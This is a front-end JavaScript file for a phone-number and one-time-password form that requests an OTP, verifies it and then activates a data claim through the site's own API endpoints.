const phoneEl = document.getElementById("phone");
const otpEl = document.getElementById("otp");
const claimTypeEl = document.getElementById("claim-type");
const logEl = document.getElementById("log-message");
const submitBtn = document.getElementById("btn-submit");

let otpRequested = false;

function log(message, isError = false) {
  logEl.innerText = message;
  logEl.style.color = isError ? '#ff6b6b' : '#a0b6c6';
}

async function postJson(path, body) {
  try {
    const res = await fetch(path, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });
    const data = await res.json();
    if (!res.ok) {
      throw new Error(data.message || 'Server error');
    }
    return data;
  } catch (error) {
    log(`Error: ${error.message}`, true);
    return null;
  }
}

document.getElementById("data-claim-form").addEventListener("submit", async (e) => {
  e.preventDefault();

  const num = phoneEl.value.trim();
  const otp = otpEl.value.trim();
  const type = claimTypeEl.value;

  if (!num) {
    return log("Please enter your phone number.", true);
  }

  submitBtn.disabled = true;
  submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

  try {
    if (!otpRequested) {
      // Step 1: Request OTP
      log("Requesting OTP...", false);
      const loginResult = await postJson("/api/login", { num });
      if (loginResult) {
        otpRequested = true;
        log("OTP sent! Please enter the code and press the button again.", false);
        otpEl.focus();
        submitBtn.innerHTML = '<span class="btn-text">Verify & Activate</span>';
      }
    } else {
      if (!otp) {
        return log("Please enter the OTP.", true);
      }
      
      // Step 2: Verify OTP
      log("Verifying OTP...", false);
      const verifyResult = await postJson("/api/verify", { num, otp });
      if (verifyResult) {
        // Step 3: Activate claim
        log("OTP verified. Activating claim...", false);
        const activateResult = await postJson("/api/activate", { number: num, type, repeats: 3 });
        if (activateResult) {
          log(`Success! Claim activated for ${num}.`, false);
          // Reset state after success
          otpRequested = false;
          phoneEl.value = '';
          otpEl.value = '';
          submitBtn.innerHTML = '<span class="btn-text">Request & Activate</span> <i class="fas fa-arrow-right"></i>';
        }
      }
    }
  } finally {
    submitBtn.disabled = false;
  }
});
